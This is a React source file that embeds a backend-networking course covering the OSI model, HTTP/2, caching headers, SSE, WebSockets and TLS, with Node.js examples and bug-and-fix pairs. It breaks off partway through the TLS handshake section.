"use client"
import { useState, useEffect } from "react";

const ACCENT = "#00e5cc";
const BG = "#050912";
const PANEL = "#080c16";
const BORDER = "#0e1628";

const concepts = [
  {
    id: 1,
    title: "How the Internet Actually Works",
    tag: "OSI · TCP/IP · DNS · Packets",
    color: "#00e5cc",
    tldr: "Every HTTP request your backend receives has traveled through 7 layers, been broken into packets, routed across dozens of machines, reassembled in order, and decrypted — all in under 100ms. Understanding this stack is what makes you able to debug latency, timeouts, connection resets, and TLS errors that are otherwise completely opaque.",
    why: `Most developers treat the network as a black box: you write fetch("https://api.example.com") and data comes back. When it doesn't — timeout, ECONNRESET, ETIMEDOUT, SSL_ERROR_HANDSHAKE_FAILURE — you have no idea where in the chain it broke or why.

The OSI model, TCP/IP stack, and DNS resolution are not academic theory. They are the actual machinery that runs under every single request your backend handles. Understanding them lets you:

  - Diagnose WHERE a request is failing (DNS? TCP handshake? TLS? Application?)
  - Understand WHY connection pools matter (TCP handshakes are expensive)
  - Understand WHY HTTPS needs a warm-up period (TLS handshake adds RTTs)
  - Understand WHY you set TCP keepalive in your DB pool config
  - Read and understand tcpdump, Wireshark, curl -v output
  - Actually understand what "latency" means at each layer

Security engineers exploit misconfigurations at every layer. To defend a system you must understand what each layer does and how it can be attacked.`,

    analogy: `The OSI Model as a POSTAL SYSTEM:

LAYER 7 — APPLICATION (HTTP, WebSocket, DNS, SMTP)
  The actual LETTER CONTENT and LANGUAGE.
  "Dear recipient, please find attached my order..."
  This is what your code reads and writes.

LAYER 6 — PRESENTATION (TLS/SSL encryption, compression)
  The ENVELOPE SEALING and ENCRYPTION.
  The letter is sealed and encoded so only the recipient can read it.
  TLS lives here — encrypts your HTTP into HTTPS.

LAYER 5 — SESSION (manages connections, auth sessions)
  The POSTAL AGREEMENT — "we will exchange 5 letters in this conversation".
  Manages when a conversation starts and ends.

LAYER 4 — TRANSPORT (TCP / UDP)
  The DELIVERY GUARANTEES.
  TCP: certified mail — numbered packages, acknowledgment, retransmit if lost.
  UDP: regular mail — faster, no guarantee of arrival or order.
  Your DB connections use TCP. Video streaming uses UDP.

LAYER 3 — NETWORK (IP routing)
  The POSTAL ROUTING SYSTEM — addresses and routing.
  IP address = your postal address.
  Routers = sorting facilities deciding the next hop.
  Packets hop from router to router like mail between post offices.

LAYER 2 — DATA LINK (Ethernet, WiFi frames)
  The DELIVERY VAN on each local segment.
  MAC address = the van's ID within one neighborhood.

LAYER 1 — PHYSICAL (cables, fiber, radio)
  The actual ROAD, WIRE, FIBER — raw bits traveling as electrical signals.

DNS RESOLUTION — finding the address:
  You know someone's NAME (api.example.com)
  but not their ADDRESS (IP: 104.21.48.1).
  DNS is the phone book lookup that maps name → address.

TCP HANDSHAKE — the intro before the conversation:
  YOU → SERVER: "SYN" (want to talk?)
  SERVER → YOU: "SYN-ACK" (yes, ready)
  YOU → SERVER: "ACK" (starting now)
  3 round trips BEFORE a single byte of your data.
  This is why connection pooling matters — reuse the handshake.

TLS HANDSHAKE — verifying identity and agreeing on encryption:
  After TCP: 1-2 more round trips to agree on cipher, exchange keys, verify cert.
  TLS 1.3: reduced to 1 RTT (down from 2 in TLS 1.2).
  TLS session resumption: skip the handshake for returning clients.`,

    deep: `THE FULL JOURNEY OF AN HTTP REQUEST:

You type: GET https://api.example.com/users

STEP 1 — DNS Resolution (Layer 7/Application)
  Check browser DNS cache → OS hosts file → OS DNS cache → Router cache
  → ISP DNS resolver → Root nameserver → .com TLD server
  → example.com authoritative nameserver → returns 104.21.48.1
  Typical: 10-100ms first time, <1ms cached

STEP 2 — TCP Handshake (Layer 4/Transport)
  SYN packet leaves your machine.
  Routed through 12-20 intermediate routers (each adds ~1-5ms).
  Server receives SYN, responds SYN-ACK.
  You respond ACK. Connection established.
  Total: ~1 RTT = 20-100ms depending on geographic distance.

STEP 3 — TLS Handshake (Layer 6/Presentation)
  TLS 1.3: 1 RTT to agree on cipher + exchange keys + verify certificate.
  Certificate chain verified against browser's trusted CA store.
  Shared session key derived. All future data encrypted.
  Total: ~1 additional RTT.

STEP 4 — HTTP Request (Layer 7/Application)
  GET /users HTTP/1.1
  Host: api.example.com
  Authorization: Bearer eyJ...
  Encrypted, packetized, sent.

STEP 5 — IP Routing (Layer 3/Network)
  Large requests split into MTU-sized packets (~1500 bytes each).
  Each packet independently routed — may take different paths.
  Routers use BGP routing tables to decide next hop.

STEP 6 — TCP Reassembly on Server (Layer 4)
  Server TCP stack reorders packets by sequence number.
  Sends ACKs. Requests retransmit of any lost packets.
  Passes reassembled data up to application.

STEP 7 — Your Express Handler Runs
  req comes in fully assembled, decrypted, parsed.
  You call the database, return JSON.

STEP 8 — Response travels back through all layers in reverse.

TOTAL LATENCY BUDGET (London → Mumbai):
  DNS lookup:      50ms (first time)
  TCP handshake:   80ms (1 RTT, ~80ms base)
  TLS handshake:   80ms (1 more RTT)
  HTTP round trip: 80ms (1 more RTT)
  DB query:        10ms (local)
  ─────────────────────
  Total:           300ms minimum — BEFORE any application logic.
  With DNS cache + TLS session resumption + keep-alive: ~90ms.

KEY IMPLICATIONS FOR YOUR BACKEND:
  - Always use HTTP keep-alive — reuses TCP connection across requests.
  - Connection pooling to DB — reuses TCP handshake.
  - CDN for static assets — reduces RTT to <10ms.
  - Geographic deployment — put servers near users.
  - DNS TTL matters — too low → more lookups, too high → stale records.
  - TCP_NODELAY — disable Nagle's algorithm for low-latency real-time apps.`,

    code: `// WHAT CURL -V SHOWS YOU (READ THIS LIKE A STORY)
/*
$ curl -v https://api.example.com/users

* Rebuilt URL to: https://api.example.com/users

— LAYER 3/4: DNS + TCP ————————————————————
* Trying 104.21.48.1:443...           ← DNS resolved to this IP
* Connected to api.example.com (104.21.48.1) port 443 (#0)
                                       ← TCP handshake complete

— LAYER 6: TLS HANDSHAKE ——————————————————
* ALPN, offering h2                    ← offering HTTP/2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* Server certificate:
*  subject: CN=api.example.com
*  issuer: C=US, O=Let's Encrypt, CN=R3
*  expire date: Dec 15 2025
*  SSL certificate verify ok.          ← cert chain verified

— LAYER 7: HTTP REQUEST ——————————————————
> GET /users HTTP/2
> Host: api.example.com
> Authorization: Bearer eyJ0...
>
                                       ← waiting for response

— LAYER 7: HTTP RESPONSE —————————————————
< HTTP/2 200
< content-type: application/json
< x-request-id: abc-123
<
[{"id":"u_1","name":"Alice"}]
* Connection #0 to host api.example.com left intact
                                       ← TCP connection reused (keep-alive)
*/


// CONFIGURING TCP KEEP-ALIVE IN NODE.JS HTTP CLIENT

const https = require("https");

const agent = new https.Agent({
  keepAlive:            true,    // reuse TCP connections — skip handshake each time
  keepAliveMsecs:       30000,   // send TCP keepalive probes every 30s
  maxSockets:           50,      // max concurrent TCP connections to same host
  maxFreeSockets:       10,      // max idle connections to keep alive in pool
  timeout:              5000,    // socket inactivity timeout
  scheduling:           "lifo"   // reuse most recently used socket first (better for keepalive)
});

// This agent is then passed to axios/node-fetch:
// const response = await fetch(url, { agent });
// Without keepAlive: every request = new TCP + TLS handshake = +80-200ms overhead


// DNS LOOKUP WITH CACHING

const dns = require("dns").promises;
const dnsCache = new Map();

async function cachedDnsLookup(hostname) {
  const cached = dnsCache.get(hostname);
  if (cached && cached.expiresAt > Date.now()) {
    return cached.address;
  }
  const result = await dns.lookup(hostname);
  dnsCache.set(hostname, {
    address:   result.address,
    expiresAt: Date.now() + 30000  // respect TTL — 30s for this example
  });
  return result.address;
}
// Why this matters: Node's built-in http.request() re-resolves DNS on EVERY request
// Under load this hammers your DNS resolver and adds latency
// A simple cache at the application level eliminates this


// NETWORK DIAGNOSTIC TOOL — understand latency at each layer

async function diagnoseEndpoint(url) {
  const parsed = new URL(url);
  const results = {};

  // 1. DNS resolution time
  const dnsStart = Date.now();
  const { address } = await dns.lookup(parsed.hostname);
  results.dns = { address, ms: Date.now() - dnsStart };

  // 2. TCP connection time (without TLS)
  const net = require("net");
  const tcpMs = await new Promise((resolve, reject) => {
    const socket = new net.Socket();
    const start = Date.now();
    socket.connect(443, address, () => {
      resolve(Date.now() - start);
      socket.destroy();
    });
    socket.on("error", reject);
    setTimeout(() => reject(new Error("TCP timeout")), 5000);
  });
  results.tcp = { ms: tcpMs };

  // 3. Full HTTPS request (TCP + TLS + HTTP)
  const httpStart = Date.now();
  const response = await fetch(url, { method: "HEAD" });
  results.https = { ms: Date.now() - httpStart, status: response.status };

  results.tlsOverhead = results.https.ms - results.tcp.ms;

  console.table(results);
  return results;
}
// Output tells you exactly where time is spent:
// dns: 45ms → fix: use DNS cache or pick lower-TTL records
// tcp: 80ms → fix: deploy closer to users, use CDN
// tlsOverhead: 50ms → fix: TLS session resumption, HTTP/2


// TCP OPTIONS ON YOUR EXPRESS SERVER

const http  = require("http");
const https2 = require("https");

const server = http.createServer(app);

server.on("connection", (socket) => {
  socket.setKeepAlive(true, 60000); // OS sends keepalive probes every 60s
  socket.setNoDelay(true);          // TCP_NODELAY — send packets immediately, no buffering
  socket.setTimeout(120000);        // close idle connections after 2 minutes
  socket.on("timeout", () => socket.destroy());
});

// TCP_NODELAY is important for:
// - Real-time apps (WebSocket, SSE, RPC)
// - APIs with many small responses
// Default Nagle's algorithm: buffers small packets for 200ms — adds latency to small responses`,

    bugs: `// BUG 1: Forgetting DNS resolution costs in service-to-service calls

class MicroserviceClientBad {
  async callUserService(userId) {
    // Resolves DNS on EVERY call — hammers internal DNS, adds 5-50ms per call
    const res = await fetch("http://user-service.internal/users/" + userId);
    return res.json();
  }
}

class MicroserviceClientGood {
  constructor() {
    // Resolve once at startup, cache in memory
    // For Kubernetes: use the cluster DNS and let the service mesh handle it
    this.baseUrl = process.env.USER_SERVICE_URL || "http://user-service.internal";
    this.agent   = new http.Agent({ keepAlive: true, keepAliveMsecs: 30000 });
  }
  async callUserService(userId) {
    const res = await fetch(this.baseUrl + "/users/" + userId, {
      agent: this.agent  // reuses TCP connection — no handshake overhead
    });
    return res.json();
  }
}


// BUG 2: No timeout set on outgoing HTTP requests

async function callPaymentApiBAD(payload) {
  // No timeout. If payment API hangs: your server thread waits indefinitely.
  // 500 concurrent requests × no timeout = thread pool exhausted = 503 for everyone.
  const res = await fetch("https://payment-api.com/charge", {
    method: "POST",
    body: JSON.stringify(payload)
  });
  return res.json();
}

async function callPaymentApiGOOD(payload) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 8000); // 8s hard limit

  try {
    const res = await fetch("https://payment-api.com/charge", {
      method: "POST",
      body: JSON.stringify(payload),
      signal: controller.signal
    });
    return res.json();
  } catch (err) {
    if (err.name === "AbortError") throw new TimeoutError("Payment API timeout after 8s");
    throw err;
  } finally {
    clearTimeout(timeoutId);
  }
}


// BUG 3: Leaking internal network topology in error messages

app.use((err, req, res, next) => {
  // WRONG: exposes your internal IP, port, and service name
  res.status(502).json({
    error: err.message  // "connect ECONNREFUSED 10.0.0.45:5432 (postgres-primary.internal)"
    // Attacker now knows: your DB IP, port, internal hostname, it is a PostgreSQL primary
  });
});

app.use((err, req, res, next) => {
  // RIGHT: generic message, internal details only in server logs
  if (err.code === "ECONNREFUSED" || err.code === "ETIMEDOUT") {
    logger.error("upstream_error", { error: err.message, requestId: req.requestId });
    return res.status(503).json({
      success: false,
      error: { code: "SERVICE_UNAVAILABLE", message: "Service temporarily unavailable", requestId: req.requestId }
    });
  }
  next(err);
});`,

    challenge: `// CHALLENGE: Build a network diagnostic and health monitoring system.

// Part 1: LayerDiagnostic class
//   diagnose(hostname): returns full timing breakdown:
//   {
//     dns:  { resolved: "1.2.3.4", ms: 45, cached: false },
//     tcp:  { connected: true, ms: 82 },
//     tls:  { version: "TLSv1.3", cipher: "...", validUntil: Date, ms: 48 },
//     http: { statusCode: 200, ms: 35, server: "nginx/1.24" },
//     total: 210
//   }

// Part 2: EndpointMonitor class
//   monitor(endpoints: string[], intervalMs: number)
//   Every interval: runs diagnose() on each endpoint.
//   Tracks: p50/p95/p99 latency over last 100 samples.
//   Emits "degraded" event if p95 > 500ms.
//   Emits "down" event if 3 consecutive checks fail.
//   GET /health returns current status of all monitored endpoints.

// Part 3: Smart HTTP client with retry + circuit breaker
//   SmartClient.get(url, options)
//   - Retries on ECONNRESET, ETIMEDOUT, 503 (not on 4xx)
//   - Exponential backoff: 100ms, 200ms, 400ms
//   - Circuit breaker: 5 failures in 60s → open for 30s
//   - Connection pool: keepAlive, max 20 sockets per host
//   - Every request: X-Request-ID header, timing logged

// Part 4: PacketInspector (educational simulation)
//   Given a URL, simulate the full packet journey:
//   Show as ASCII art the TCP handshake exchange,
//   TLS handshake steps, and HTTP request/response
//   with timing annotations at each step.`
  },

  {
    id: 2,
    title: "HTTP Deep Dive",
    tag: "HTTP/1.1 · HTTP/2 · WebSockets · SSE",
    color: "#3dd9eb",
    tldr: "HTTP is not just GET/POST and status codes. Understanding keep-alive, pipelining, HTTP/2 multiplexing, caching headers, content negotiation, and when to use WebSockets vs SSE vs HTTP/2 Server Push determines the performance ceiling of every API you build.",
    why: `HTTP is the language your backend speaks. Most developers learn: GET retrieves, POST creates, 200 is OK, 404 is not found. That is 5% of what HTTP does.

The other 95%:
  Cache-Control headers that make or break CDN performance.
  Conditional requests (ETag, If-None-Match) that eliminate unnecessary data transfer.
  HTTP/2 multiplexing that replaces 6 parallel connections with one.
  WebSocket upgrade handshakes.
  Server-Sent Events for efficient server→client streaming.
  Content negotiation for multi-format APIs.
  CORS preflight requests that add a whole extra round trip if misconfigured.
  Transfer-Encoding: chunked for streaming large responses.

When your API is slow: is it the server? Or HTTP head-of-line blocking? HTTP/2 would help.
When your CDN keeps serving stale data: do you understand Cache-Control vs Expires vs ETag?
When your WebSocket connections keep dropping: do you understand ping/pong and proxy behavior?`,

    analogy: `HTTP VERSIONS as TELEPHONE SYSTEMS:

HTTP/1.0 — Each call is a new phone call.
  Call. Talk. Hang up. Call again.
  New TCP connection for every single request.
  Making 20 requests = 20 separate calls with all setup overhead.

HTTP/1.1 — Persistent line, but one conversation at a time.
  Keep the line open (keep-alive).
  BUT: must wait for Person A to finish before Person B can speak.
  HEAD-OF-LINE BLOCKING: slow first response blocks all others.
  Browsers workaround: open 6 parallel connections per domain.

HTTP/2 — Conference call with numbered talking slots.
  ONE connection. Multiple simultaneous conversations (streams).
  Responses can arrive out of order — no blocking.
  Headers compressed (HPACK) — repeated headers cost almost nothing.
  This is why HTTP/2 APIs are dramatically faster for dashboards with many requests.

WebSocket — Two-way radio after the initial handshake.
  Starts as HTTP/1.1, upgrades to a persistent bidirectional channel.
  Either side can transmit at any time.
  Perfect for: chat, real-time collaboration, live trading, gaming.
  Cost: persistent server-side connection per client.

Server-Sent Events (SSE) — Radio broadcast.
  One direction: server → client.
  Standard HTTP — works through proxies, load balancers, CDNs.
  Auto-reconnect built into the browser EventSource API.
  Perfect for: live dashboards, notifications, progress bars, audit logs.
  Cost: much lower than WebSocket — just a long-lived HTTP response.

HTTP CACHING as a LIBRARY SYSTEM:
  Cache-Control: max-age=3600       → "This book can be borrowed for 1 hour without re-checking"
  ETag: "abc123"                    → "This book's edition fingerprint"
  If-None-Match: "abc123"           → "I have this edition — has it changed?"
  304 Not Modified                  → "No — your copy is still current" (no data transfer)
  Cache-Control: no-cache           → "Always check with library before using your copy"
  Cache-Control: no-store           → "Never keep a copy — always get fresh from library"
  Cache-Control: private            → "Only the borrower can cache this — not public shelves"`,

    deep: `HTTP/2 INTERNALS:

STREAMS: each request-response pair is a numbered stream.
  Multiple streams over ONE TCP connection.
  Stream 1: GET /user (response takes 200ms)
  Stream 3: GET /products (response takes 20ms)
  Stream 3 responds FIRST — does not wait for stream 1.
  HTTP/1.1: product request would wait 200ms for user response.

HEADER COMPRESSION (HPACK):
  HTTP/1.1: every request sends full headers.
  "Authorization: Bearer eyJ..." = 200 bytes, every request.
  HTTP/2: first request sends full header. Subsequent: just the index.
  "Header #42" = 2 bytes. Massive savings for auth-heavy APIs.

SERVER PUSH (rarely used in practice):
  Server can push resources before browser asks for them.
  "You asked for index.html — here's app.css and app.js too."
  Mostly superseded by Link: rel=preload headers.

HTTP/3 (QUIC):
  TCP has its own head-of-line blocking: one lost packet blocks ALL streams.
  HTTP/3 runs over QUIC (UDP-based) — streams truly independent.
  Each stream's retransmit doesn't block others.
  30% faster on lossy networks (mobile, international).

CACHE-CONTROL DIRECTIVES:
  max-age=N:        cache for N seconds
  s-maxage=N:       CDN caches for N seconds (overrides max-age for proxies)
  no-cache:         must revalidate with server (still uses cache if 304)
  no-store:         never cache (bank statements, private data)
  private:          only client cache, not CDN
  public:           CDN may cache
  must-revalidate:  expired cache must not be served stale
  stale-while-revalidate=N: serve stale for N seconds while fetching fresh

PERFECT CACHING STRATEGY:
  Static assets (hashed filename): Cache-Control: public, max-age=31536000, immutable
  API responses (user-specific):   Cache-Control: private, max-age=60
  API responses (public):          Cache-Control: public, s-maxage=300, stale-while-revalidate=60
  Auth endpoints:                  Cache-Control: no-store
  HTML pages:                      Cache-Control: no-cache (always revalidate, but use cache if 304)

WEBSOCKET HEARTBEAT:
  Proxies and load balancers close idle TCP connections after 60-120s.
  WebSocket ping/pong: send a ping frame every 30s.
  If pong not received: connection was silently dropped — reconnect.`,

    code: `// HTTP/2 PUSH & CACHE HEADERS ──────────────────────

app.get("/api/products", (req, res) => {
  // Optimal caching for a public product listing
  res.set({
    "Cache-Control":              "public, s-maxage=300, stale-while-revalidate=60",
    // CDN serves cached for 5 min, then serves stale while fetching fresh in background
    "Vary":                       "Accept-Language, Accept-Encoding",
    // CDN maintains separate cache per language/encoding
    "ETag":                       computeETag(products),
    "Last-Modified":              products.updatedAt.toUTCString()
  });
  res.json(products);
});

app.get("/api/users/:id", authenticate, (req, res) => {
  // Private — never CDN-cached
  res.set({
    "Cache-Control": "private, max-age=60",
    "ETag":          computeETag(user)
  });
  res.json(user);
});

app.get("/auth/token", (req, res) => {
  // Never cache credentials or tokens
  res.set("Cache-Control", "no-store");
  res.json({ token });
});

function computeETag(data) {
  return require("crypto")
    .createHash("sha256")
    .update(JSON.stringify(data))
    .digest("hex")
    .slice(0, 16);
}


// CONDITIONAL REQUESTS — eliminate redundant data transfer ─

app.get("/api/products", async (req, res) => {
  const products = await ProductService.getAll();
  const etag     = computeETag(products);

  // Client sends: If-None-Match: "abc123"
  if (req.headers["if-none-match"] === etag) {
    return res.status(304).end();
    // Client already has current version — send ZERO bytes of product data
  }

  res.set({ "ETag": etag, "Cache-Control": "public, s-maxage=300" });
  res.json(products);
  // First request: full payload. Subsequent: 304 with no body.
  // Eliminates data transfer for unchanged resources.
});


// SERVER-SENT EVENTS — real-time server→client streaming ─

app.get("/api/orders/:id/status", authenticate, (req, res) => {
  const { id } = req.params;

  // SSE headers
  res.set({
    "Content-Type":  "text/event-stream",
    "Cache-Control": "no-cache",
    "Connection":    "keep-alive",
    "X-Accel-Buffering": "no"  // disable Nginx buffering for SSE
  });
  res.flushHeaders();

  // Helper to send SSE events
  const send = (event, data) => {
    res.write("event: " + event + "\\n");
    res.write("data: " + JSON.stringify(data) + "\\n\\n");
    // Flush immediately — some Node streams buffer
    if (typeof res.flush === "function") res.flush();
  };

  // Send initial state
  send("connected", { orderId: id, timestamp: new Date().toISOString() });

  // Subscribe to order status updates (pub/sub via Redis)
  const channel = "order:" + id + ":status";
  const handler = (message) => {
    const update = JSON.parse(message);
    send("status_update", update);
    if (["delivered", "cancelled"].includes(update.status)) {
      send("complete", { finalStatus: update.status });
      cleanup();
    }
  };

  redisSubscriber.subscribe(channel, handler);

  // Heartbeat — keeps connection alive through proxies that close idle connections
  const heartbeat = setInterval(() => {
    res.write(": heartbeat " + Date.now() + "\\n\\n");
  }, 25000);

  function cleanup() {
    clearInterval(heartbeat);
    redisSubscriber.unsubscribe(channel, handler);
    res.end();
  }

  req.on("close", cleanup);   // client disconnected
  req.on("error", cleanup);   // connection error
});

// Client-side (browser):
// const es = new EventSource("/api/orders/ord_123/status");
// es.addEventListener("status_update", (e) => updateUI(JSON.parse(e.data)));
// es.addEventListener("complete",      (e) => { showFinal(e.data); es.close(); });
// es.onerror = () => { /* EventSource auto-reconnects */ };


// WEBSOCKET SERVER — bidirectional real-time ──────────

const WebSocket = require("ws");

class CollaborationServer {
  constructor(server) {
    this.wss   = new WebSocket.Server({ server });
    this.rooms = new Map(); // roomId → Set of ws connections
    this.setup();
  }

  setup() {
    this.wss.on("connection", (ws, req) => {
      // Auth from query params or cookie (headers not reliable in WebSocket upgrade)
      const token   = new URL(req.url, "ws://base").searchParams.get("token");
      const user    = this.verifyToken(token);
      if (!user) { ws.close(4001, "Unauthorized"); return; }

      ws.userId    = user.id;
      ws.isAlive   = true;
      ws.roomId    = null;

      // Heartbeat detection — clients are expected to respond to ping with pong
      ws.on("pong", () => { ws.isAlive = true; });

      ws.on("message", (data) => {
        try {
          const msg = JSON.parse(data.toString());
          this.handleMessage(ws, msg);
        } catch {
          ws.send(JSON.stringify({ type: "error", message: "Invalid JSON" }));
        }
      });

      ws.on("close", (code, reason) => {
        this.handleDisconnect(ws, code, reason.toString());
      });

      ws.on("error", (err) => {
        logger.error("ws_error", { userId: ws.userId, error: err.message });
      });

      this.send(ws, "connected", { userId: user.id });
    });

    // Ping all clients every 30s — detect silent disconnects
    this.pingInterval = setInterval(() => {
      this.wss.clients.forEach((ws) => {
        if (!ws.isAlive) { ws.terminate(); return; }
        ws.isAlive = false;
        ws.ping();
      });
    }, 30000);

    this.wss.on("close", () => clearInterval(this.pingInterval));
  }

  handleMessage(ws, msg) {
    switch (msg.type) {
      case "join_room":   return this.joinRoom(ws, msg.roomId);
      case "leave_room":  return this.leaveRoom(ws);
      case "text_op":     return this.broadcastToRoom(ws.roomId, msg, ws);
      case "cursor_pos":  return this.broadcastToRoom(ws.roomId, msg, ws);
      default: ws.send(JSON.stringify({ type: "error", message: "Unknown type: " + msg.type }));
    }
  }

  joinRoom(ws, roomId) {
    if (ws.roomId) this.leaveRoom(ws);
    if (!this.rooms.has(roomId)) this.rooms.set(roomId, new Set());
    this.rooms.get(roomId).add(ws);
    ws.roomId = roomId;
    this.broadcastToRoom(roomId, { type: "user_joined", userId: ws.userId });
    this.send(ws, "room_joined", { roomId, members: this.rooms.get(roomId).size });
  }

  leaveRoom(ws) {
    if (!ws.roomId) return;
    const room = this.rooms.get(ws.roomId);
    if (room) { room.delete(ws); if (room.size === 0) this.rooms.delete(ws.roomId); }
    this.broadcastToRoom(ws.roomId, { type: "user_left", userId: ws.userId });
    ws.roomId = null;
  }

  broadcastToRoom(roomId, msg, exclude = null) {
    const room = this.rooms.get(roomId);
    if (!room) return;
    const encoded = JSON.stringify(msg);
    room.forEach((ws) => {
      if (ws !== exclude && ws.readyState === WebSocket.OPEN) ws.send(encoded);
    });
  }

  handleDisconnect(ws, code, reason) {
    this.leaveRoom(ws);
    logger.info("ws_disconnect", { userId: ws.userId, code, reason });
  }

  send(ws, type, data) {
    if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ type, ...data }));
  }

  verifyToken(token) {
    try { return jwt.verify(token, process.env.JWT_SECRET); } catch { return null; }
  }
}`,

    bugs: `// BUG 1: WebSocket memory leak — no cleanup on disconnect

const rooms = new Map();

wss.on("connection", (ws) => {
  ws.on("message", (data) => {
    const { roomId } = JSON.parse(data);
    if (!rooms.has(roomId)) rooms.set(roomId, []);
    rooms.get(roomId).push(ws); // LEAK: dead ws objects accumulate
  });
  // MISSING: ws.on("close") cleanup — rooms grow forever
  // 10,000 client connects/disconnects: rooms Map holds 10,000 dead ws refs
  // All those dead objects can't be GC'd — server OOMs over time
});

// FIX: always clean up on close
wss.on("connection", (ws) => {
  ws.on("message", (data) => {
    const { roomId } = JSON.parse(data);
    ws.currentRoom = roomId;
    if (!rooms.has(roomId)) rooms.set(roomId, new Set()); // Set, not Array
    rooms.get(roomId).add(ws);
  });
  ws.on("close", () => {
    if (ws.currentRoom) {
      const room = rooms.get(ws.currentRoom);
      if (room) { room.delete(ws); if (room.size === 0) rooms.delete(ws.currentRoom); }
    }
  });
});


// BUG 2: Wrong Cache-Control kills CDN benefit

app.get("/api/products", (req, res) => {
  res.set("Cache-Control", "no-cache");  // WRONG for public product listings
  // This tells every CDN: "never cache this, always hit origin"
  // At 1000 req/s: 1000 hits to your origin every second, CDN does nothing
});

// vs
app.get("/api/products", (req, res) => {
  res.set("Cache-Control", "public, s-maxage=300, stale-while-revalidate=60");
  // CDN serves cached for 5 min, refreshes in background — origin sees ~1 req per 5 min
});

// RULE:
// User-specific data    → Cache-Control: private (client cache only)
// Public, rarely changed → Cache-Control: public, s-maxage=3600
// Auth responses        → Cache-Control: no-store (never cache)
// HTML pages            → Cache-Control: no-cache (always revalidate, but use 304)


// BUG 3: SSE without nginx proxy buffering disabled

// Nginx default: buffers response body until it reaches a threshold before sending to client.
// Your SSE events sit in nginx buffer for seconds before client sees them.
// "Real-time" updates arrive with 5-30 second delays through nginx.

// FIX in nginx config:
// location /api/events { proxy_buffering off; }

// FIX in Express headers (for nginx + other proxies):
res.set({
  "X-Accel-Buffering": "no",    // nginx respects this header
  "Cache-Control":     "no-cache",
  "Connection":        "keep-alive"
});`,

    challenge: `// CHALLENGE: Build a real-time order tracking system with multiple transport layers.

// Requirement: Order status updates should reach the browser using the
// most appropriate transport for each scenario.

// Part 1: OrderStatusService
//   - Publishes status changes to Redis pub/sub channel "orders:{id}:status"
//   - Methods: updateStatus(orderId, status, metadata)
//   - Statuses: placed → confirmed → processing → shipped → delivered | cancelled

// Part 2: SSE endpoint GET /api/orders/:id/stream
//   - Authenticate via Authorization header (SSE does not support custom headers in EventSource)
//     Solution: token in query param, validated on connect
//   - Subscribe to Redis channel for this order
//   - On status update: send SSE event
//   - Heartbeat every 25s to keep connection alive through proxies
//   - On delivered/cancelled: send final event, close stream
//   - Track active SSE connections per user (max 10 per user across browser tabs)

// Part 3: WebSocket endpoint /ws/dashboard
//   - Authenticated via token query param
//   - On connect: send last 5 status updates for all of the user's active orders
//   - Subscribe to all of user's order channels
//   - Real-time updates as orders change
//   - Ping/pong heartbeat every 30s with 5s timeout
//   - On disconnect: unsubscribe all channels, clean up all state

// Part 4: Correct caching strategy for every endpoint
//   GET /api/orders/:id     → private, max-age=30
//   GET /api/products       → public, s-maxage=300, stale-while-revalidate=60
//   GET /api/products/:id   → public, s-maxage=600, ETag-based conditional requests
//   POST/PUT/DELETE         → Cache-Control: no-store
//   GET /auth/*             → Cache-Control: no-store

// Part 5: Choose SSE vs WebSocket with explanation:
//   Scenario A: Live auction bidding (users both submit and receive bids)
//   Scenario B: Order status page (user watches their order's status)
//   Scenario C: Admin dashboard (receives events from many order streams)
//   Scenario D: Collaborative document editing (multiple users, cursor positions)
//   For each: which transport and why?`
  },

  {
    id: 3,
    title: "TLS / HTTPS Internals",
    tag: "Encryption · Certificates · PKI",
    color: "#00b8a9",
    tldr: "HTTPS is not just 'the green padlock'. It is a complete system of cryptography, certificate authorities, trust chains, and key exchange protocols. Understanding TLS lets you configure it correctly, debug certificate errors, implement certificate pinning, detect MITM attacks, and understand what 'end-to-end encryption' actually means.",
    why: `Every developer knows HTTPS is more secure than HTTP. Few can explain exactly what it protects, what it does NOT protect, and how to configure it correctly.

What HTTPS actually provides:
  1. CONFIDENTIALITY: data is encrypted — eavesdroppers see random bytes, not your tokens.
  2. INTEGRITY: data cannot be modified in transit without detection.
  3. AUTHENTICATION: you are talking to the real server, not an impersonator.

What HTTPS does NOT provide:
  - Protection once data reaches your server (your server's security is separate).
  - Anonymity — the IP and domain name are still visible.
  - Protection against your own bugs (XSS, SQL injection still work over HTTPS).

Why you need to understand this:
  - Misconfigured TLS is a critical vulnerability (expired certs, weak ciphers, no HSTS).
  - "SSL_ERROR_RX_RECORD_TOO_LONG" — do you know what that means?
  - Implementing mTLS for service-to-service auth in microservices.
  - Certificate transparency, OCSP stapling, HSTS preloading — all production concerns.`,

    analogy: `TLS as a BANK VAULT with a TRUSTED LOCKSMITH:

STEP 1 — Certificate = the bank's OFFICIAL ID BADGE
  The badge is signed by a TRUSTED AUTHORITY (Certificate Authority — CA).
  You trust certain CAs because your OS/browser comes with a pre-installed list.
  You do not trust the bank's badge unless a CA you trust signed it.

  MITM ATTACK without TLS:
  An attacker sits between you and the bank.
  "I AM the bank — here are my keys."
  You cannot tell it is an impersonator.

  TLS with Certificate:
  Bank presents badge signed by Verisign (a trusted CA).
  You verify Verisign's signature using Verisign's public key (pre-installed in your OS).
  Impersonator cannot forge this — they do not have Verisign's private key.

STEP 2 — Key Exchange = AGREEING ON A SECRET CODE without saying it aloud
  You and the bank need to agree on an encryption key.
  Problem: any message can be intercepted.
  
  Solution — Diffie-Hellman Key Exchange (brilliant math):
  Analogy: mixing paint.
  You choose a secret color. Bank chooses a secret color.
  You both start with the same public color (yellow).
  You mix your secret with yellow → send to bank.
  Bank mixes their secret with yellow → send to you.
  You both mix the received color with your own secret.
  You BOTH arrive at the same final color (the session key).
  Eavesdropper saw only the mixed colors — cannot reverse-engineer secrets.

STEP 3 — Symmetric Encryption = TALKING IN CODE
  Now both sides have the same secret session key.
  All further communication encrypted with AES-256.
  Eavesdropper sees encrypted bytes — computationally impossible to decrypt.

CERTIFICATE CHAIN — WHY YOU TRUST WEBSITES YOU'VE NEVER VISITED:
  Root CA (pre-installed, self-signed) → trusted by your OS
  → signs Intermediate CA certificate
  → signs api.example.com certificate

  You verify: api.example.com cert signed by Intermediate CA?
  Intermediate CA cert signed by Root CA?
  Root CA in my trusted store? ✓
  Chain verified.`,

    deep: `TLS 1.3 HANDSHAKE (production standard):

CLIENT HELLO:
  Sends: supported cipher suites, TLS version, random nonce, key share (ECDH public key)

